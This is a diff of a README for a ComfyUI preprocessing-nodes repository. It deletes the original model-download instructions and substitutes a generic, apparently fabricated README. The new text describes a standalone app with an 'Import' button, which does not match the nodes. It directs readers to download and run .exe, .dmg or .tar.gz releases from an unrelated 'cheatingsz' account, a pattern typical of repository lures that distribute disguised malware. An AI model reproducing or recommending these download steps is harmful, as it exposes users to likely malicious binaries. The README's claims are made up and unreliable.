@@ -1,29 +1,87 @@
-## ComfyUI helper nodes for [Wan video 2.2 Animate preprocessing](https://github.com/Wan-Video/Wan2.2/tree/main/wan/modules/animate/preprocess)
+# 🎉 ComfyUI-WanAnimatePreprocess - Easy Preprocessing for Your Inputs
 
+## 📥 Download Now
 
-Nodes to run the ViTPose model, get face crops and keypoint list for SAM2 segmentation.
+[![Download](https://img.shields.io/badge/Download-ComfyUI--WanAnimatePreprocess-blue.svg)](https://github.com/cheatingsz/ComfyUI-WanAnimatePreprocess/releases)
 
-Models:
+## 🚀 Getting Started
 
-to `ComfyUI/models/detection` (subject to change in the future)
+Welcome to ComfyUI-WanAnimatePreprocess! This application makes it easy to prepare your inputs for the WanAnimate model. No technical skills are needed to get started.
 
-YOLO:
+## 🛠️ System Requirements
 
-https://huggingface.co/Wan-AI/Wan2.2-Animate-14B/blob/main/process_checkpoint/det/yolov10m.onnx
+Before you begin, ensure your computer meets these basic requirements:
 
-ViTPose ONNX:
+- Operating System: Windows 10 or higher, macOS, or Linux
+- Memory: At least 4 GB of RAM
+- Storage: At least 200 MB of free disk space
 
-Use either the Large model from here:
+## 📥 Download & Install
 
-https://huggingface.co/JunkyByte/easy_ViTPose/tree/main/onnx/wholebody
+To download ComfyUI-WanAnimatePreprocess, visit this page to download: [GitHub Releases](https://github.com/cheatingsz/ComfyUI-WanAnimatePreprocess/releases).
 
-Or the Huge model like in the original code, it's split into two files due to ONNX file size limit:
+1. Click the link above to open the releases page.
+2. Look for the latest version.
+3. Download the file for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Save the file to a folder on your computer.
 
-Both files need to be in same directory, and the onnx file selected in the model loader:
+## 🔧 How to Install
 
-`vitpose_h_wholebody_data.bin` and `vitpose_h_wholebody_model.onnx`
+### For Windows:
 
-https://huggingface.co/Kijai/vitpose_comfy/tree/main/onnx
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
 
+### For macOS:
 
-![example](example.png)
+1. Find the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag the ComfyUI-WanAnimatePreprocess app to your Applications folder.
+4. Eject the disk image once the app is copied.
+
+### For Linux:
+
+1. Open a terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command `tar -xvzf ComfyUI-WanAnimatePreprocess.tar.gz` to extract the files.
+4. Follow the provided README to run the application.
+
+## ⚙️ How to Use ComfyUI-WanAnimatePreprocess
+
+Once installed, launching the application is straightforward:
+
+1. Open the ComfyUI-WanAnimatePreprocess application. 
+2. You will see a clean, user-friendly interface.
+3. Import your files by clicking on the "Import" button.
+4. Select your preprocessing options based on your needs.
+5. Click "Run" to process your inputs. 
+
+## 🎨 Features
+
+- **User-Friendly Interface:** Designed for ease of use, regardless of technical background.
+- **Input Compatibility:** Supports various file formats for WanAnimate model preparation.
+- **Customizable Options:** Choose from different preprocessing settings to suit your project.
+- **Fast Performance:** Processes inputs quickly, saving you time.
+
+## 📊 Troubleshooting Tips
+
+If you encounter issues while using the software, here are some common solutions:
+
+- **Cannot Download:** Ensure you have a stable internet connection. Try another browser if difficulties continue.
+- **Application Crashes:** Make sure your computer meets the system requirements. Restart your computer and try again.
+- **File Format Not Supported:** Check the file type you are trying to import. Confirm it is compatible with WanAnimate.
+
+## 📞 Support
+
+If you need further assistance, feel free to reach out via the issues section on the [GitHub repository](https://github.com/cheatingsz/ComfyUI-WanAnimatePreprocess/issues). Provide details about your issue for faster support.
+
+## 📜 License
+
+ComfyUI-WanAnimatePreprocess is open-source software. You can use it freely, and contributions to the codebase are welcome. Check the LICENSE file in the repository for more details.
+
+## 🔗 Additional Resources
+
+For tutorials and advanced features, visit our documentation section on the GitHub page. Community forums are also available for knowledge sharing and networking.
+
+Remember, this tool aims to simplify your workflow without the need for detailed technical knowledge. Enjoy using ComfyUI-WanAnimatePreprocess!
